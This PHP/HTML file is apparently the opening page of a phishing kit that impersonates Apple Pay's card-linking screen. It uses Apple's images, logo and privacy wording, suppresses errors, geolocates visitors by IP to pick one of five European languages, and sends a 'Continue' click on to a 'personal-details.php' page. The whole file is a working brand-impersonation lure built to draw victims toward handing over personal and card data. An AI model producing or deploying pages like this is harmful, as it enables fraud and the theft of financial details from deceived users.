<?php
error_reporting(0);
include 'lib/page-functions.php';

page_initialise();
?>


<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">

    <title>Apple Pay</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="./lib/jquery.js"></script>
  </head>
  <body>
    <style>
      .content {
        width: 500px;
      }

      .input-section {
        border-top: 1px solid lightgray;
        padding: 10px;
      }

      .input-desc {
        font-weight: bold;
        text-align: center;
        font-size: 13px;
        margin-right: 15px;
      }

      .input {
        border-radius: 0 !important;
        border: 0px solid lightgray;
        background: rgba(155, 155,155, 0.2);
      }

      .input:focus {
        outline: none;
      }

      .submit {
        margin-top: 1px;
        width: 100%;
        background: rgb(10, 132, 255);
        color: white;
        border: 1px solid rgb(60, 60, 255);
        border-radius: 7px;
        height: 35px;
      }

      .submit:hover {
        filter: brightness(95%);
      }

      .logo {
        width: 20%;
        display: block;
        margin: auto;
        margin-top: 15px;
      }

      .title {
        font-size: 20px;
        margin-top: 10px;
        text-align: center;
      }

      .inner-content {
        padding-left: 40px;
        padding-right: 40px;
      }

      .disclaimer {
        text-align: center;
        margin-top: 45px;
        font-size: 14px;
      }

      .disclaimer-link {
        text-align: center;
        font-size: 14px;
      }

      .black {
        background-color: black;
        outline: none;
        border: none;
      }

      #center {
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);

        width: 500px;
      }

      @media only screen and (max-width: 1035px) {
        #center {
          margin-top: 50px;
          position: relative !important;
          transform: none;
          top: 0%;
          left: 0%;
        }

        .title {
          margin-top: 30px;
          font-size: 19px;
        }

        .disclaimer {
          font-size: 13px;
        }

        .submit {
          width: 90%;
          display: block;
          margin: auto;
          margin-top: 30px;
        }
      }

      body {
        background: #FAFAFA;
      }
    </style>

    <div class="container content">
      <div class="row" id="center">
        <div class="col-lg-12">
          <div class="col-12">
          </div>
          <div class="row">
            <div class="col-lg-12 inner-content">
              <img style="width: 250px; display: block; margin: auto; margin-bottom: 15px;" src="https://www.apple.com/newsroom/images/product/services/standard/iPhone_X_Apple_Pay_Wallet_Action_screen_inline.jpg.large.jpg">
              <br>
              <img style="margin-top: 15px;" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Apple_Pay_logo.svg/1024px-Apple_Pay_logo.svg.png">
              <h2 class="title" id="title1">Connect your debit and credit cards with Apple Pay to make secure payments in apps, on the web and in stores using NFC.</h2>
              <p class="disclaimer" id="title2">Card-related information, location and information about device settings and use patterns will be sent to Apple and may be shared together with account information with your card issuer or bank to set up Apple Pay.
              <br><br><a href="#" class="disclaimer-link" id="title3">See how your data is managed.</a></p>
            </div>
          </div>
        </div>
        <button class="submit" id="title4">Continue</button>
      </div>
    </div>

    <?php
      if ($_SERVER["REMOTE_ADDR"] == "::1") { $ip = '102.129.166.255'; } else { $ip = $_SERVER["REMOTE_ADDR"]; }
      $country_code = strtolower(json_decode(file_get_contents("http://ipinfo.io/$ip"), true)["country"]);

      if ($country_code != 'gb' && $country_code != 'fr' && $country_code != 'es' && $country_code != 'it' && $country_code != 'de') {
        $country_code = "gb";
      }
     ?>

    <script>

    // Auto Translator

    var page_elements = ["title1", "title2", "title3", "title4"];
    var current_language = "<?= $country_code ?>".toLowerCase();

    var languages = {
      gb: {
        title1: 'Connect your debit and credit cards with Apple Pay to make secure payments in apps, on the web and in stores using NFC.',
        title2: 'Card-related information, location and information about device settings and use patterns will be sent to Apple and may be shared together with account information with your card issuer or bank to set up Apple Pay.',
        title3: 'See how your data is managed.',
        title4: 'Continue'
      },
      fr: {
        title1: "Connectez vos cartes de débit et de crédit à Apple Pay pour effectuer des paiements sécurisés dans les applications, sur le Web et dans les magasins à l'aide de NFC.",
        title2: "Les informations relatives à la carte, l'emplacement et les informations sur les paramètres de l'appareil et les habitudes d'utilisation seront envoyées à Apple et peuvent être partagées avec les informations de compte avec l'émetteur de votre carte ou votre banque pour configurer Apple Pay.",
        title3: "Découvrez comment vos données sont gérées.",
        title4: "Continuer"
      },
      es: {
        title1: 'Conecte sus tarjetas de débito y crédito con Apple Pay para realizar pagos seguros en aplicaciones, en la web y en tiendas mediante NFC.',
        title2: 'La información relacionada con la tarjeta, la ubicación y la información sobre la configuración del dispositivo y los patrones de uso se enviarán a Apple y se pueden compartir junto con la información de la cuenta con el emisor de la tarjeta o el banco para configurar Apple Pay.',
        title3: 'Vea cómo se gestionan sus datos.',
        title4: 'Continuar'
      },
      it: {
        title1: 'Collega le tue carte di debito e di credito con Apple Pay per effettuare pagamenti sicuri nelle app, sul Web e nei negozi tramite NFC.',
        title2: "Le informazioni relative alla carta, la posizione e le informazioni sulle impostazioni del dispositivo e sui modelli di utilizzo verranno inviate ad Apple e potrebbero essere condivise insieme alle informazioni sull'account con l'istituto di emissione della carta o la banca per configurare Apple Pay.",
        title3: 'Guarda come vengono gestiti i tuoi dati.',
        title4: 'Continua'
      },
      de: {
        title1: 'Verbinden Sie Ihre Debit- und Kreditkarten mit Apple Pay, um mit NFC sicher in Apps, im Internet und in Geschäften zu bezahlen.',
        title2: "Kartenbezogene Informationen, Standort und Informationen über Geräteeinstellungen und Nutzungsmuster werden an Apple gesendet und können zusammen mit Kontoinformationen an Ihren Kartenaussteller oder Ihre Bank weitergegeben werden, um Apple Pay einzurichten.",
        title3: 'Sehen Sie, wie Ihre Daten verwaltet werden.',
        title4: 'Fortsetzen'
      }
    }

    for (var i = 0; i < page_elements.length; i++) {
      $('#' + page_elements[i]).text(languages[current_language][page_elements[i]])
    }
    </script>

    <script>


      let btn = document.getElementById("title4");

      btn.onclick = function () {
        $('#center').fadeOut(1000);
        setTimeout(function() {
          window.location = 'personal-details.php';
        }, 1000);
      }
    </script>
  </body>
</html>
